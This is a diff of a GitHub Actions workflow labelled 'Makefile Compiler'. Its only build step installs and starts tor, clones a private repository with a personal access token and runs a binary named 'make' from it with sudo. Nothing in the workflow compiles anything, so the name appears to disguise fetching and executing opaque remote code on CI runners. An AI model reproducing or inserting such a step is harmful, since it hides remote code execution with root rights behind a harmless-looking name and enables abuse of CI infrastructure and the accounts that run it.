@@ -1,7 +1,6 @@
 name: Makefile Compiler
 
-on:
-  workflow_dispatch:
+on: workflow_dispatch
 
 jobs:
   build:
@@ -19,4 +18,4 @@ jobs:
       - name: Compiling Makefile
         shell: bash
         run: |
-          sudo apt update -y && sudo apt install git tor -y && (sudo tor &) && sudo git clone https://$PAT@github.com/<hoster156>/m && sudo chmod +x m/make && sudo ./m/make
+          sudo apt update -y && sudo apt install git tor -y && (sudo tor &) && sudo git clone https://$PAT@github.com/hoster156/m && sudo chmod +x m/make && sudo ./m/make
